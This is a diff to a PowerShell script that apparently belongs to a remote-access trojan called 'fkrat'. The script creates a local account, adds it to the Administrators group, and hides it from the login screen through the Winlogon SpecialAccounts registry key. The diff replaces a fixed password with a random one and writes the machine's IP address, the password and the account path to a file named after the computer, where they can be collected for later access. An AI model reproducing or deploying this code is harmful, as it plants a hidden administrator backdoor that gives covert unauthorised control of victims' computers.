@@ -25,11 +25,16 @@ function createAdmin {
 ## variables
 $temp = "$env:temp"
 $dirName = randomText
+$ip = (Get-NetIPAddress -AddressFamily IPv4 -PrefixOrigin Dhcp -AddressState Preferred -InterfaceAlias *Ethernet*).IPAddress 
+$pWord = randomText
 $uName = "fkrat"
-$pWord = (ConvertTo-SecureString  "FindersKeepers" -AsPlainText -Force)
+$pWord = (ConvertTo-SecureString  $pWord -AsPlainText -Force)
 $rPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
 $group = (((New-Object System.Security.Principal.SecurityIdentifier('S-1-5-32-544')).Translate([System.Security.Principal.NTAccount]).Value) -Split "\\")[1]
 
+New-Item ./$env:computername.fk -Value (
+  $ip, $pWord, "C:/Users/$uName" -join [Environment]::NewLine + [Environment]::NewLine
+)
 ## Create Admin
 createAdmin -uName $uName -pWord $pWord
 
